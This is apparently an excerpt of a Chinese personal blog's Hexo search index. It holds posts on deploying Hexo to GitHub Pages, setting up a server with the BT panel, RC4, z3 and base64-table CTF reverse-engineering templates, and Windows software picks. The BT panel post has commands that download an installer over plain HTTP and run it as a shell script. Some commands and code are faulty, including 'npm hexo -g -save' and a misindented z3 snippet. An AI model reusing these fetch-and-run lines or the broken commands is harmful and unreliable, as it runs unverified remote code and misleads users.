alt="image-20220118140321432"></p><p>然后输入</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cd 你那个文件的路径，参考我图片</span><br></pre></td></tr></table></figure><p><img src="https://pic.imgdb.cn/item/61e658582ab3f51d91e59844.png" alt="image-20220118140408269"></p><p>然后输入</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hexo init</span><br></pre></td></tr></table></figure><p><img src="https://pic.imgdb.cn/item/61e658fd2ab3f51d91e624f4.png" alt="image-20220118140652577"></p><p>这里出现star bloging……代表成功了，失败了话可能就是网不行</p><p><img src="https://pic.imgdb.cn/item/61e659752ab3f51d91e68bee.png" alt="image-20220118140851786"></p><p>然后输入hexo s(停下来点击bash页面按ctrl c)</p><p>出现一个网址，然后你就可以去网站里面访问了，看一下自己的劳动成果</p><p><img src="https://pic.imgdb.cn/item/61e659cf2ab3f51d91e6d9d0.png" alt="image-20220118141022177"></p><p>这个丑界面就是你的博客了</p><p>然后我们需要配置一下文件</p><p><img src="https://pic.imgdb.cn/item/61e65a462ab3f51d91e73d13.png" alt="image-20220118141221978"></p><p>打开后翻到代码的最底部</p><p><img src="https://pic.imgdb.cn/item/61e65a7d2ab3f51d91e76644.png" alt="image-20220118141317027"></p><p>把这个deploy改一下(可以仿照一下我这样写)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">deploy:</span><br><span class="line">  type: git</span><br><span class="line">  repo: git@github.com:thestarx/thestarx.github.io.git</span><br><span class="line">  branch: main</span><br></pre></td></tr></table></figure><p>注意分号后有个空格就行</p><p>然后保存退出就可以把代码放入云端了</p><p>输入</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">hexo c</span><br><span class="line">hexo g</span><br><span class="line">hexo d</span><br></pre></td></tr></table></figure><p>一键三连把代码上传到github仓库</p><p>可能出现的错误</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">如果输入 hexo d 出现以下错误：</span><br><span class="line">fatal: unable to auto-detect email address (got &#x27;z@DESKTOP-DPE3A08.(none)&#x27;)</span><br><span class="line">error: src refspec HEAD does not match any</span><br><span class="line">error: failed to push some refs to &#x27;https://github.com/seekwhale13/seekwhale13.ithub.io.git&#x27;</span><br><span class="line">可以先输入再hexo d：</span><br><span class="line">git config --global user.email &quot;你的邮箱&quot;</span><br><span class="line">git config --global user.name &quot;你的gihub名字&quot;</span><br><span class="line">例如：</span><br><span class="line">git config --global user.email &quot;2841810250@qq.com&quot;</span><br><span class="line">git config --global user.name &quot;thestar0&quot;</span><br></pre></td></tr></table></figure><p><img src="https://pic.imgdb.cn/item/61e65d8c2ab3f51d91e9fc46.png" alt="image-20220118142618977"></p><p>然后你就可以用你的github用户名.github.io访问你的网站了</p><p>安装主题，可以去github里面搜索hexo theme</p><p>github里面找到下载链接即可</p><p>还有一种方式去hexo官网上下载主题</p><p>不过我一般就直接输入命令</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git clone -b master https://github.com/jerryc127/hexo-theme-butterfly.git themes/butterfly</span><br></pre></td></tr></table></figure><p>这一个命令直接下载安装butterfly主题（我用那款，还有很多主题可以自己去看看自己喜欢的)</p><p>安装成功后在你的c盘里面用户文件夹</p><p><img src="https://pic.imgdb.cn/item/61e6600d2ab3f51d91ec342e.png" alt="image-20220118143700929"></p><p>然后把这里面的主题名字文件夹复制粘贴到你创建文件里面的theme</p><p><img src="https://pic.imgdb.cn/item/61e6608e2ab3f51d91eca0ab.png" alt="image-20220118143909440"></p><p>我这款主题需要引擎所以需要输入</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install hexo-renderer-pug hexo-renderer-stylus --save</span><br></pre></td></tr></table></figure><p><img src="https://pic.imgdb.cn/item/61e65fae2ab3f51d91ebe4a3.png" alt="image-20220118143545652"></p><p>之后还有很多美化的步骤，可以不懂前端照样可以弄成自己喜欢的模样</p><p>css，js，yml文件……</p><p>这才刚刚开始</p><p>还有文章的上传等等</p><p>所以这才刚刚开始</p>]]></content>
      
      
      <categories>
          
          <category> 前端 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> hexo </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>搭建网站如此easy</title>
      <link href="//ae9a7e33.html"/>
      <url>//ae9a7e33.html</url>
      
        <content type="html"><![CDATA[<h1>拥有一个自己的网站</h1><blockquote><p>相信任何人都曾想拥一个属于自己的网站吧</p></blockquote><h2 id="网站分类">网站分类</h2><p>网站可以分为很多种，商用个人……，这里不多说，我们目前的需求可能也就是一个博客，如果是学前端或者web的话，还有一些用处</p><h2 id="网站部署">网站部署</h2><p>网站部署可以分为很多种</p><p>讲一下自己试过的几种</p><ul><li>搭建服务器加wordpress搭建博客，简单易上手，不过需要服务器</li><li>hexo加github或者gitee或者coding……，本地部署后然后托管在github的这一些仓库，如果单纯是弄一个简单的博客还不是很难，如果你想自己个性自定义的话，就需要一点点前端的知识</li></ul><h2 id="简单讲一下这两种">简单讲一下这两种</h2><h3 id="第一种：">第一种：</h3><p>讲一下自己走过的坑，千万不要相信免费服务器，最贵的服务器永远是免费服务器，不过还是有一些地方可以白嫖一下下服务器，比如甲骨文，谷歌等服务器，前提是你要有visa双币信用卡</p><p>还有一些服务器可以白嫖，不过只能白嫖一个月，比如阿里云，腾讯云，华为云，还有一些高校计划，答几个题就能得2周的服务器玩玩</p><h3 id="第二种：">第二种：</h3><p>前期部署容易走很多坑，还部署过程中也容易出现一些bug，不过可以非常自由的自定义，非常nice</p><h2 id="服务器分类">服务器分类</h2><p>大致上分为windows服务器，linux服务器</p><p>我目前的认知是linux服务器就一个黑窗口，好处就是学习linux命令哈哈哈，确定方便，windows服务器可以像远程桌面一样，可以自己写个游戏在网站上面玩，最近几天我都遇见了</p><p>上图<img src="https://pic.imgdb.cn/item/61e3ec0d2ab3f51d9134be6b.png" alt="image-20220116175732968"></p><p>这只是一个网站，第一眼惊艳到我了</p><blockquote><p>windows服务器照样可以搭博客</p></blockquote><p>第二种搭建方式，表面上不用服务器，不过后面就会发现没有服务器，有些东西根本做不了</p><h2 id="部署网站">部署网站</h2><h3 id="第一种方式">第一种方式</h3><p>当你搞到一个服务器差不多就这样</p><p><img src="https://pic.imgdb.cn/item/61e3edc32ab3f51d91360480.png" alt="image-20220116180451782"></p><p>然后改一个实例密码</p><p><img src="https://pic.imgdb.cn/item/61e3ee392ab3f51d913656fe.png" alt="image-20220116180650057"></p><p>然后去网上下载xshell（<s>曾经我追求专业版，后面发现就一个窗口多少的作用，所以不一定要去搞专业版</s>）</p><p><img src="https://pic.imgdb.cn/item/61e3f2942ab3f51d9139ca80.png" alt="image-20220116182525731"></p><p><img src="https://pic.imgdb.cn/item/61e3f2d52ab3f51d9139fc68.png" alt="image-20220116182630438"></p><p><img src="https://pic.imgdb.cn/item/61e3f30b2ab3f51d913a2305.png" alt="image-20220116182725035"></p><p>这就是连接成功后的</p><p>然后我们就在这里输入宝塔面板安装命令就行了</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">CentOS安装命令：</span><br><span class="line">yum install -y wget &amp;&amp; wget -O install.sh http://download.bt.cn/install/install_6.0.sh &amp;&amp; sh install.sh</span><br><span class="line">Ubuntu/Deepin安装命令：</span><br><span class="line">wget -O install.sh http://download.bt.cn/install/install-ubuntu_6.0.sh &amp;&amp; sudo bash install.sh </span><br><span class="line">Debian安装命令：</span><br><span class="line">wget -O install.sh http://download.bt.cn/install/install-ubuntu_6.0.sh &amp;&amp; bash install.sh</span><br><span class="line">Fedora安装命令:</span><br><span class="line">wget -O install.sh http://download.bt.cn/install/install_6.0.sh &amp;&amp; bash install.sh </span><br><span class="line">//在白嫖或者购买服务器的时候要注意看一下是Linux什么版本的系统</span><br></pre></td></tr></table></figure><blockquote><p>解释一下宝塔面板：宝塔面板是简单好用的服务器运维面板工具软件，支持一键LAMP/LNMP/集群/监控/网站/FTP/数据库/JAVA等100多项服务器管理功能</p><blockquote><p>安装过程极度舒适，成功后会有sucess的单词</p></blockquote></blockquote><p>如果停下来后不知道成功了没有，你就对命令行输入bt，看一下是否有这个</p><p><img src="https://pic.imgdb.cn/item/61e3f4392ab3f51d913b1123.png" alt="image-20220116183226833"></p><p>有的话继续输入 14 查看面板默认信息</p><p><img src="https://pic.imgdb.cn/item/61e3f4a42ab3f51d913b7482.png" alt="image-20220116183413819"></p><p>会有一个链接，在游览器里面打开试一下，如果没有成功，就是安全组没有放行8888端口</p><p><img src="https://pic.imgdb.cn/item/61e3f5362ab3f51d913bdbd8.png" alt="image-20220116183639106"></p><p>然后手动添加放行端口</p><p><img src="https://pic.imgdb.cn/item/61e3f5fe2ab3f51d913c5f84.png" alt="image-20220116183959440"></p><p>成功后应该可以进入宝塔面板的登录界面了（是外网地址哦）</p><p>输入刚才命令行的用户名和密码</p><p>然后进去</p><p><img src="https://pic.imgdb.cn/item/61e3f67e2ab3f51d913cbac5.png" alt="image-20220116184207301"></p><p><img src="https://pic.imgdb.cn/item/61e3f6eb2ab3f51d913d061a.png" alt="image-20220116184356131"></p><p><img src="https://pic.imgdb.cn/item/61e3f74e2ab3f51d913d43a2.png" alt="image-20220116184535570"></p><blockquote><p>这个讲一下域名，域名自己可以买一个，不过要备案，还有证书一系列的东西</p><p>国外的服务器是不需要备案的，不过你没有备案，你的网站3分钟内被封哈哈哈说的就是我</p></blockquote><p><img src="https://pic.imgdb.cn/item/61e3f8202ab3f51d913dce24.png" alt="image-20220116184905161"></p><blockquote><p>点进去，打不开的话，你没有安全组放行80端口，可以依照上放8888端口一样自行创建</p></blockquote><p><img src="https://pic.imgdb.cn/item/61e3f86c2ab3f51d913dfeef.png" alt="image-20220116185021349"></p><p>我的就被封了，后面要输入宝塔密码那些就行了</p><p><img src="https://pic.imgdb.cn/item/61e3f8cb2ab3f51d913e4885.png" alt="image-20220116185156257"></p><p>然后里面输入用户名和密码就行了</p><blockquote><p>搭网站还有很多细节，这里就不多讲了，比如ssh密钥，证书，域名解析……，这里有个伪静态可以设置一下</p></blockquote><p><img src="https://pic.imgdb.cn/item/61e3f91f2ab3f51d913e85f9.png" alt="image-20220116185320895"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">location /</span><br><span class="line">&#123;</span><br><span class="line"> try_files $uri $uri/ /index.php?$args;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">rewrite /wp-admin$ $scheme://$host$uri/ permanent;</span><br></pre></td></tr></table></figure><p>这样部署网站熟悉后，几分钟搞出一个网站不是问题</p><h3 id="第二种方式">第二种方式</h3><p>hexo加github或者gitee，coding……</p><blockquote><p>前置条件</p><p>安装git<img src="https://pic.imgdb.cn/item/61e3fa172ab3f51d913f3406.png" alt="image-20220116185728527"></p><p><img src="https://pic.imgdb.cn/item/61e3faaa2ab3f51d913f977e.png" alt="image-20220116185955683"></p></blockquote><blockquote><p>安装node js</p><p><img src="https://pic.imgdb.cn/item/61e3faec2ab3f51d913fe04a.png" alt="image-20220116190101265"></p></blockquote><blockquote><p><a href="http://xn--githubgithubgithub-qz12a9xgk49iy6dgtxl7c54miai1251df7oe3clr3bl33ajm2fy42a0hkga2934a3p8qkyub.io">然后就是github里面创建一个仓库名称为你的github的用户名加github.io</a>，比如我的thetarx.github.io我有两github账号，这个是github pro版的哈哈哈，这个创建仓库这个可以本地部署后再创建</p></blockquote><blockquote><p>本地部署，打算后面再讲，先简单说一句</p><p>先在一个常用磁盘里面创建一个文件夹，然后右键</p><p><img src="https://pic.imgdb.cn/item/61e3fc3b2ab3f51d9140cf2f.png" alt="image-20220116190636533"></p></blockquote><p>不过我不建议这样，因为失败可能性很大，建议搜索git bash，然后管理员方式打开然后cd D:blog这个命令，这个是例子，你放在哪里救救cd 到哪里</p><p><img src="https://pic.imgdb.cn/item/61e3fcc52ab3f51d91413025.png" alt="image-20220116190854484"></p><p>然后安装hexo</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm hexo -g -save</span><br></pre></td></tr></table></figure><p>应该是这个，出错了去网上搜一下，解释一下-g是表示全局安装,-save是保存的意思</p><p>然后输入</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hexo init</span><br></pre></td></tr></table></figure><p>如果失败了，建议重启试一下node js这个东西有点奇怪，我当时重启了才解决（其实上面还有很多细节，比如ssh密钥配置等等）</p><p>然后重启完后hexo init试一下</p><p>如果又失败</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git config --global user.name &quot;thestarx&quot;输入你自己的github用户名字，记得把我</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git config --global user.email thestar0icu@gmail.com 还有一个googe账号</span><br></pre></td></tr></table></figure><p>我觉得应该会成功</p><p>如果出现了blog sucess还有你文件夹里面多了很多文件，尤其是__config.yml文件</p><p>成功了的话，输入</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hexo s</span><br></pre></td></tr></table></figure><p>如果成功了话，你本地博客就部署成功了</p><p><img src="https://pic.imgdb.cn/item/61e3fea22ab3f51d9142821a.png" alt="image-20220116191650704"></p><p>那个butterfly是我安装的主题，你出现了这个链接代表你成功了</p><p>游览器访问就行</p><p>至于云端部署下次再说，太多了</p><p>附上自己魔改博客</p><p><img src="https://pic.imgdb.cn/item/61e3ffab2ab3f51d91435469.png" alt="image-20220116192116687"></p>]]></content>
      
      
      <categories>
          
          <category> 前端 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 网站 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>rc4模板</title>
      <link href="//7dd77d14.html"/>
      <url>//7dd77d14.html</url>
      
        <content type="html"><![CDATA[<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//程序开始</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">unsigned</span> longULONG;</span><br><span class="line"> </span><br><span class="line"><span class="comment">/*初始化函数*/</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">rc4_init</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">char</span>*s, <span class="keyword">unsigned</span> <span class="keyword">char</span>*key, <span class="keyword">unsigned</span> <span class="keyword">long</span> Len)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i = <span class="number">0</span>, j = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">char</span> k[<span class="number">256</span>] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">char</span> tmp = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i&lt;<span class="number">256</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        s[i] = i;</span><br><span class="line">        k[i] = key[i%Len];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i&lt;<span class="number">256</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        j = (j + s[i] + k[i]) % <span class="number">256</span>;</span><br><span class="line">        tmp = s[i];</span><br><span class="line">        s[i] = s[j];<span class="comment">//交换s[i]和s[j]</span></span><br><span class="line">        s[j] = tmp;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="comment">/*加解密*/</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">rc4_crypt</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">char</span>*s, <span class="keyword">unsigned</span> <span class="keyword">char</span>*Data, <span class="keyword">unsigned</span> <span class="keyword">long</span> Len)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i = <span class="number">0</span>, j = <span class="number">0</span>, t = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> k = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">char</span> tmp;</span><br><span class="line">    <span class="keyword">for</span> (k = <span class="number">0</span>; k&lt;Len; k++)</span><br><span class="line">    &#123;</span><br><span class="line">        i = (i + <span class="number">1</span>) % <span class="number">256</span>;</span><br><span class="line">        j = (j + s[i]) % <span class="number">256</span>;</span><br><span class="line">        tmp = s[i];</span><br><span class="line">        s[i] = s[j];<span class="comment">//交换s[x]和s[y]</span></span><br><span class="line">        s[j] = tmp;</span><br><span class="line">        t = (s[i] + s[j]) % <span class="number">256</span>;</span><br><span class="line">        Data[k] ^= s[t];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">char</span> s[<span class="number">256</span>] = &#123; <span class="number">0</span> &#125;, s2[<span class="number">256</span>] = &#123; <span class="number">0</span> &#125;;<span class="comment">//S-box</span></span><br><span class="line">    <span class="keyword">char</span> key[<span class="number">256</span>] = &#123; <span class="string">&quot;justfortest&quot;</span> &#125;;</span><br><span class="line">    <span class="keyword">char</span> pData[<span class="number">512</span>] = <span class="string">&quot;这是一个用来加密的数据Data&quot;</span>;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> len = <span class="built_in">strlen</span>(pData);</span><br><span class="line">    <span class="keyword">int</span> i;</span><br><span class="line"> </span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;pData=%s\n&quot;</span>, pData);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;key=%s,length=%d\n\n&quot;</span>, key, <span class="built_in">strlen</span>(key));</span><br><span class="line">    rc4_init(s, (<span class="keyword">unsigned</span> <span class="keyword">char</span>*)key, <span class="built_in">strlen</span>(key));<span class="comment">//已经完成了初始化</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;完成对S[i]的初始化，如下：\n\n&quot;</span>);</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i&lt;<span class="number">256</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%02X&quot;</span>, s[i]);</span><br><span class="line">        <span class="keyword">if</span> (i &amp;&amp; (i + <span class="number">1</span>) % <span class="number">16</span> == <span class="number">0</span>)<span class="built_in">putchar</span>(<span class="string">&#x27;\n&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\n\n&quot;</span>);</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i&lt;<span class="number">256</span>; i++)<span class="comment">//用s2[i]暂时保留经过初始化的s[i]，很重要的！！！</span></span><br><span class="line">    &#123;</span><br><span class="line">        s2[i] = s[i];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;已经初始化，现在加密:\n\n&quot;</span>);</span><br><span class="line">    rc4_crypt(s, (<span class="keyword">unsigned</span> <span class="keyword">char</span>*)pData, len);<span class="comment">//加密</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;pData=%s\n\n&quot;</span>, pData);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;已经加密，现在解密:\n\n&quot;</span>);</span><br><span class="line">    <span class="comment">//rc4_init(s,(unsignedchar*)key,strlen(key));//初始化密钥</span></span><br><span class="line">    rc4_crypt(s2, (<span class="keyword">unsigned</span> <span class="keyword">char</span>*)pData, len);<span class="comment">//解密</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;pData=%s\n\n&quot;</span>, pData);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1>==本脚本模板使用时修改main函数里面的key和data==</h1>]]></content>
      
      
      <categories>
          
          <category> reverse </category>
          
      </categories>
      
      
        <tags>
            
            <tag> reverse </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>z3模板</title>
      <link href="//86fa490e.html"/>
      <url>//86fa490e.html</url>
      
        <content type="html"><![CDATA[<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> z3 <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">       x = BitVec(<span class="string">&quot;x&quot;</span>,<span class="number">32</span>)</span><br><span class="line">       s = Solver()</span><br><span class="line">       s.add(x != -<span class="number">1</span>)</span><br><span class="line">       s.add(-<span class="number">1</span> == <span class="number">2</span>*x+<span class="number">1</span>)</span><br><span class="line">       s.check()</span><br><span class="line">   <span class="built_in">print</span>(s.model())</span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> reverse </category>
          
      </categories>
      
      
        <tags>
            
            <tag> reverse </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>base64变表模板</title>
      <link href="//5059044f.html"/>
      <url>//5059044f.html</url>
      
        <content type="html"><![CDATA[<h1>base64变表脚本模板</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line">data=<span class="string">&#x27;Wj1gWE9xPSGUQ0KCPCGET09WR1qSzZ&#x27;</span><span class="comment">#这里输入密文</span></span><br><span class="line">oldtable=<span class="string">&#x27;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/&#x27;</span><span class="comment">#老表</span></span><br><span class="line">newtable=<span class="string">&#x27;ZYXABCDEFGHIJKLMNOPQRSTUVWzyxabcdefghijklmnopqrstuvw0123456789+/&#x27;</span><span class="comment">#这里输入魔改变表</span></span><br><span class="line">result=<span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> ch <span class="keyword">in</span> data:</span><br><span class="line">    result +=oldtable[newtable.index(ch)]</span><br><span class="line">result = <span class="built_in">bytearray</span>(base64.b64decode(result+<span class="string">&#x27;==&#x27;</span>))</span><br><span class="line"><span class="comment">#这里输入base64加密后再进行加密的逆算法</span></span><br><span class="line"><span class="comment">#比如一个加密完再来个异或</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(result)):</span><br><span class="line">    result[i] ^= i</span><br><span class="line"><span class="built_in">print</span>(result)</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> reverse </category>
          
      </categories>
      
      
        <tags>
            
            <tag> reverse </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>推荐7款windows软件</title>
      <link href="//f0924219.html"/>
      <url>//f0924219.html</url>
      
        <content type="html"><![CDATA[<h1>送几个非常nice的软件</h1><h2 id="1-Rolan">1. Rolan</h2><blockquote><p>一款非常简洁优秀的快速启动软件，可以放常用软件和文件夹链接，支持全局快捷键ALT ＋ 空格</p></blockquote><p><img src="https://gitee.com/thestar0/tuchuang/raw/master/img/image-20220108202034744.png" alt="image-20220108202034744"></p><h2 id="2-MacTypeTray">2.MacTypeTray</h2><blockquote><p>让你拥有mac的字体渲染，我们经常面对屏幕，一个看着惹眼的字体对眼睛的好处不言而喻</p></blockquote><ul><li><p>官网下载即可</p></li><li><p>设置的时候建议选择独立加载模式</p><p><img src="https://gitee.com/thestar0/tuchuang/raw/master/img/image-20220108202633275.png" alt="image-20220108202633275"></p></li></ul><p><img src="https://gitee.com/thestar0/tuchuang/raw/master/img/image-20220108202654070.png" alt="image-20220108202654070"></p><p><img src="https://gitee.com/thestar0/tuchuang/raw/master/img/image-20220108202701428.png" alt="image-20220108202701428"></p><h2 id="3-No-Meiryo-UI">3. No!!Meiryo UI</h2><blockquote><p>全局字体，我用的自己网上下载的Misans字体，windows下有个叫什么黑砂什么字体也不错，我自己比较喜欢小米最新发布的Misans字体，对我这种打字排版非常nice</p><p>在这里顺便分享一下敲代码的字体，程序员公认的字体有很多，分析一下我最喜欢的两种敲代码的字体Consolas 和专为开发者设计的JetBrains Mono</p></blockquote><p><img src="https://gitee.com/thestar0/tuchuang/raw/master/img/image-20220108203658448.png" alt="image-20220108203652487"></p><p><strong>Consolas字体</strong></p><p><img src="https://gitee.com/thestar0/tuchuang/raw/master/img/image-20220108203757733.png" alt="image-20220108203757733"></p><p><strong>JetBrains Mono字体</strong></p><p><img src="https://gitee.com/thestar0/tuchuang/raw/master/img/image-20220108203908776.png" alt="image-20220108203908776"></p><h2 id="4-Fence">4. Fence</h2><blockquote><p>如果你电脑桌面非常乱，这一款软件绝对会一键让你找不到软件</p></blockquote><p><img src="https://gitee.com/thestar0/tuchuang/raw/master/img/image-20220108204033408.png" alt=""></p><h2 id="5-Snipaste">5. Snipaste</h2><blockquote><p>一款超级强大的截图软件，一个快捷键F1截图，还能修改大小，还能实时编辑，功能很多不多说，反正非常强大，还有个贴图的功能快捷键F3把图贴到屏幕上，不用为了抄一个东西一直切换窗口了，功能真的非常无敌</p></blockquote><p><img src="https://gitee.com/thestar0/tuchuang/raw/master/img/image-20220108204524374.png" alt="image-20220108204524374"></p><p><img src="https://gitee.com/thestar0/tuchuang/raw/master/img/image-20220108204615111.png" alt="image-20220108204615111"></p><h2 id="6-IDM">6. IDM</h2><blockquote><p>托管下载神器，可以结合油猴实现百度网盘满速下载，最高支持32线程，下载速度拉满</p></blockquote><p>默认是8线程，自己可以改，还有接管游览器下载等功能</p><p><img src="https://gitee.com/thestar0/tuchuang/raw/master/img/image-20220108204801084.png" alt="image-20220108204801084"></p><h2 id="7-火绒安全">7. 火绒安全</h2><blockquote><p>这个好像没啥好分享的哈哈哈</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> 软件 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 软件 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>雷军10年编程自述</title>
      <link href="//5c0378d8.html"/>
      <url>//5c0378d8.html</url>
